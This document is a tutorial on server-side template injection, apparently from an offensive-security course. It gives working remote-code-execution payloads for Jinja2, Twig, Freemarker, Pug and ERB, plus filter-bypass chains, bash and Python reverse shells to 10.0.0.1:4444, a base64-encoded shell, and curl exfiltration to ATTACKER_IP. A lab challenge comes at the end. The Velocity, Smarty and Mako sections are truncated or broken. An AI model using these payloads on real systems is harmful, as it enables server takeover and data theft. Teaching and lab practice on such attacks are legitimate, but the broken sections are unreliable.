Template Injection

Server-Side Template Injection - executing arbitrary code by injecting template directives into server-side template engines

Overview

Server-Side Template Injection (SSTI) happens when user input is compiled as part of a template, so the engine executes attacker-controlled expressions on the server. This article identifies the engine from its syntax, walks the Jinja2 object-introspection chain to command execution, and covers Twig, Freemarker, Velocity, Smarty, Mako, Pug, and ERB. By the end you can detect template injection, name the engine, and reach remote code execution.

Required Reading

  • HTTP - request handling, parameters, and rendering pipelines
  • Processes - code execution, execve, subprocess creation

Template Engines Are Compilers

A template engine is a compiler that transforms template strings into executable code. When user input is interpolated into a template AND then compiled/interpreted by the engine, the user controls part of the program. This is distinct from XSS - SSTI executes on the server, in the application's runtime, with access to the filesystem, environment, and network.

User Input → Template String → Template Engine Compile → Render → Response
                  ↑
         Injection Point:
         {{7*7}} should be "{{7*7}}"
         {{7*7}} evaluates to 49

The critical distinction: In XSS , {{7*7}} appears as text in the page. In SSTI, it evaluates to 49 . The template engine interpreted it. That is the test that confirms SSTI.

Detection Methodology

Mathematical Expression Test

Send template expressions for multiple engines in parallel. If any evaluates, you've identified both the vulnerability and the engine.

# Test all common template syntaxes
curl -X POST 'http://target/search' -d 'q={{7*7}}' -s | grep -o '49'
curl -X POST 'http://target/search' -d 'q=${7*7}' -s | grep -o '49'
curl -X POST 'http://target/search' -d 'q=<%= 7*7 %>' -s | grep -o '49'
curl -X POST 'http://target/search' -d 'q=#{7*7}' -s | grep -o '49'
curl -X POST 'http://target/search' -d 'q=[[7*7]]' -s | grep -o '49'
						
import requests

ENGINE_MATH_PAYLOADS = {
    "Jinja2 / Twig / Nunjucks / Handlebars": "{{7*7}}",
    "Jinja2 (Python)": "{{7*'7'}}",  # Returns 7777777 (string repeat)
    "Freemarker": "${7*7}",
    "Velocity": "#set($x=7*7)$x",
    "Smarty": "{$smarty.now}",
    "Mako": "${7*7}",
    "ERB": "<%= 7*7 %>",
    "Jade / Pug": "#{7*7}",
    "Slim": "*{7*7}",
    "Razor": "@(7*7)",
    "Thymeleaf": "[[${7*7}]]",
    "Jinja2 (expression)": "{% print(7*7) %}",
    "Django": "{% debug %}",  # Django does not evaluate {{7*7}}
    "Pebble": "{{7*7}}",
    "Mustache": "{{7*7}}",  # Note: Mustache is logic-less, won't evaluate
}

def detect_template_engine(target_url, param='q', method='GET'):
    for engine, payload in ENGINE_MATH_PAYLOADS.items():
        try:
            if method == 'GET':
                r = requests.get(target_url, params={param: payload}, timeout=5)
            else:
                r = requests.post(target_url, data={param: payload}, timeout=5)

            if '49' in r.text and payload not in r.text:
                print(f"[+] {engine}: EVALUATED (found 49 in response)")
            elif payload in r.text:
                print(f"[-] {engine}: Reflected literally (not evaluated)")
            else:
                print(f"[?] {engine}: Unknown (49 not found, payload not reflected)")
        except Exception as e:
            print(f"[!] {engine}: Error — {e}")

detect_template_engine('http://target/search', param='q')

Jinja2 (Python Flask) Exploitation

Jinja2 is the most commonly encountered SSTI engine in CTF s and real-world testing. It's the default template engine for Flask.

Jinja2 Object Introspection

Python's introspection capabilities make Jinja2 exploitation straightforward once you understand the chain. You need to navigate from a string or integer object to subprocess.Popen through Python's class hierarchy.

'' (string) → __class__ → __mro__ → object → __subclasses__() → find subprocess.Popen

Step 1: Get the class of an empty string

{{ ''.__class__ }}
# Output: <class 'str'>

Step 2: Reach object via MRO

{{ ''.__class__.__mro__ }}
# Output: (<class 'str'>, <class 'object'>)

Step 3: List Subclasses

{{ ''.__class__.__mro__[1].__subclasses__() }}
# Output: [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>, ...]

Step 4: Call subprocess.Popen

# Step 4a: Find the index manually (varies by Python version and imports)
# In the lab: check the rendered list for subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX] }}

# Step 4b: Call Popen with a command
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate()[0] }}

Automating the subclass index

# On the target, or in your own Python environment:
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'Popen' in cls.__name__:
        print(f"Index {i}: {cls}")

Full Jinja2 RCE payload

# Standard chain: '' → object → subclasses → Popen
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}

# Alternative: using __subclasses__ with __init__ and __globals__
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}

# Using __builtins__ in __globals__
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__.__builtins__['exec']('import os; os.system("id")') }}

# Shortest chain (if os._wrap_close is imported)
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Using lipsum (Flask-specific global)
{{ lipsum.__globals__['os'].popen('id').read() }}

# Using config (Flask-specific)
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Using request (Flask-specific)
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}

Why the Chain Works

  1. __class__ - Every Python object has this. It returns the object's class.
  2. __mro__ - The Method Resolution Order is a tuple of classes in inheritance order. Index [1] is always object for any class.
  3. __subclasses__() - The object class tracks all classes that directly inherit from it. This is the complete registry of every class loaded in the Python interpreter. Among them is subprocess.Popen .

Jinja2 Filter Bypass

When characters like . , [ , ] are filtered:

# Using attr() filter instead of .attribute
{{ ''|attr('__class__') }}

# Chaining attr()
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}

# Using getattr()
{{ getattr('', '__class__') }}

# Bypass dot filtering with dict syntax
{{ ''['__class__'] }}

# Bypass underscore filtering using hex
{{ ''["\x5f\x5fclass\x5f\x5f"] }}

# Bypass using request.args for blocked characters (send as parameter)
# Request: /vuln?q={{...}}&attr1=__class__&attr2=__mro__
{{ ''|attr(request.args.attr1) }}

# Bypass quote filtering using request.values
{{ lipsum.__globals__.__builtins__.open(request.values.file).read() }}
# POST body: file=/etc/passwd

# Using | join filter to construct strings
{{ ['__cl', 'ass__']|join }}

# Using format string
{{ "%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95) }}

Jinja2 Reverse Shell

# Full reverse shell in Jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX](
    'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"',
    shell=True, stdout=-1
).communicate() }}

# Using os.system (simpler, no stdout capture)
{{ lipsum.__globals__.os.system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"') }}

# Using Python reverse shell
{{ lipsum.__globals__.os.popen(
    'python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
    's.connect((\"10.0.0.1\",4444));'
    'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
    'pty.spawn(\"/bin/bash\")"'
).read() }}

Twig (PHP) Exploitation

Twig is the template engine for Symfony. It's more restricted than Jinja2 but still exploitable.

Twig RCE (Symfony < 4.x)

{{ _self.env.registerUndefinedFunctionCallback("system") }}
{{ _self.env.getFilter("id") }}

# With the callback registered, undefined functions map to system
{{ id }}  # Executes: system('id')

# Alternative: using filter
{{ ['id']|filter('system') }}

# Sensitive Twig globals
{{ _self }}           # Template reference
{{ _context }}         # Context variables
{{ app }}              # Symfony application (if in Symfony)
{{ app.environment }}  # Symfony environment
{{ app.request }}      # Current request object

Twig template_from_string (if available)

{{ include(template_from_string('test')) }}

# With sandbox disabled:
{{ include(template_from_string('{{ system("id") }}')) }}

Freemarker (Java) Exploitation

Freemarker is notoriously easy to exploit because the new() builtin and Execute exist by default in some configurations.

# Command execution via Execute (if exposed as a bean)
${"freemarker.template.utility.Execute"?new()("id")}

# Alternative: using ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id".split(" ")).start()}

# Accessing application context for Spring beans
${applicationContext}

# Reading files via Freemarker builtins
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

Java class loading chain

# Classic Execute wrapper
<#assign ex="freemarker.template.utility.Execute"?new()>
<#assign result=ex("id")>
${result}

# Reading environment
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("env")}

# Reverse shell
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}

Velocity (Java) Exploitation

# Velocity RCE via ClassTool
#set($runtime = $class.inspect("java.lang.Runtime").type.getRuntime())

$process.waitFor()
$process.getInputStream()

Older Smarty versions allowed raw PHP execution if {php} wasn't disabled:

{$smarty.template_object->smarty}

Mako is a Python template engine used by some frameworks:

Jade/Pug (Node.js) Exploitation

Pug is the default template engine for Express.js when using the Jade lineage:

#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

// Simpler
#{global.process.mainModule.require('child_process').execSync('id')}

// Using = (unescaped)
- var x = process.mainModule.require('child_process')
- var y = x.execSync('id').toString()
p= y

// File read
#{require('fs').readFileSync('/etc/passwd')}

ERB (Ruby) Exploitation

ERB is Ruby's built-in template engine:

<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines %>
<%= %x{id} %>

Detection via Side Effects

When mathematical expressions aren't reflected or evaluated:

Time-Based Detection

# Jinja2/Twig: use sleep
{{ range(99999999)|list }}          # CPU exhaustion (time-based)
{% if 1==1 %}{% sleep 5 %}{% endif %}# Works in some engines

# ERB
<%= sleep(5) %>

Error-Based Detection

Force the template engine to throw an error that reveals its identity:

{{ undefined_variable }}
<%= undefined %>
${undefined}

The error message and stack trace often contain the engine name and version.

Out-of-Band (OOB) Detection

Make the template engine connect to your server:

# Jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen(
    'curl http://ATTACKER_IP:8888/$(hostname)'
).read() }}

# Simpler: using urllib if available
{{ lipsum.__globals__.__builtins__.__import__('urllib.request').urlopen(
    'http://ATTACKER_IP:8888/' + lipsum.__globals__.__builtins__.__import__('os').popen('hostname').read().strip()
).read() }}

SSTI in Non-Web Contexts

Email Templates

Many applications allow users to customize email templates. If the template is processed server-side:

Hello {{user.name}},

Your account settings:
{{ ''.__class__.__mro__[1].__subclasses__()... }}

The rendered email (which the attacker may receive if they trigger it) contains the output of the exploit.

Report Generators

Applications that generate PDF s, Excel, or CSV from templates:

Report Title: {{ config.items() }}
Generated by: {{ ''.__class__.__mro__[1].__subclasses__() }}

The generated document reveals server-side data.

404 / Error Pages

Some sites include the requested path in the error page:

http://target/{{7*7}}

If the 404 page shows 49 , the URL path was template-evaluated.

Fixes

Defense How
Don't let users control templates Render static templates with structured data. User input is injected as data, not as template code.
Use logic-less templates Mustache and its variants have no logic. {{variable}} only does value substitution, never expression evaluation.
Sandbox the engine Jinja2 has SandboxedEnvironment. Twig has a sandbox extension. Use them.
Content-Security-Policy CSP doesn't stop SSTI (it's server-side). But it limits what an XSS-payload-injected-via-SSTI can do.
Escaping by default Enable autoescaping so SSTI payloads are HTML-encoded (partial mitigation, doesn't stop RCE).
Principle of least privilege Run the template rendering process with minimal permissions (no network, restricted filesystem).

Jinja2 sandbox setup

from jinja2 import Environment, select_autoescape, SandboxedEnvironment

env = SandboxedEnvironment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string(user_template_string)
rendered = template.render(data=user_data)
# Sandbox blocks __class__, __mro__, __subclasses__, import, etc.

Django autoescape is on by default

from django.template import Template, Context
t = Template(user_input, autoescape=True)
# The template engine processes {{ }} but autoescape HTML-encodes output
# SSTI is still possible — just harder to turn into reflected XSS

Challenge

Exploit the lab container. It serves the same expression through five engines, and each endpoint has a different filter. Identify the engine first, then build the chain to id output and finally a reverse shell.

template-injection.Containerfile

podman build -t template-injection -f template-injection.Containerfile .
podman run -d -p 5000:5000 template-injection

# Confirm evaluation (expect 49 where the engine compiles the input):
curl 'http://localhost:5000/jinja2?input={{7*7}}'
curl 'http://localhost:5000/twig?input={{7*7}}'

# Jinja2: walk the class hierarchy to subprocess.Popen and run a command.
# The index of subprocess.Popen varies; print the subclass list first:
curl 'http://localhost:5000/jinja2?input={{%20%27%27.__class__.__mro__[1].__subclasses__()%20}}'

# Endpoints:
#   GET /jinja2?input=             Jinja2, no filter
#   GET /jinja2-bypass?input=      Jinja2 with dot and underscore filtering
#   GET /twig?input=               Twig (PHP)
#   GET /freemarker?input=         Freemarker (Java)
#   GET /pug?input=                Pug (Node.js)
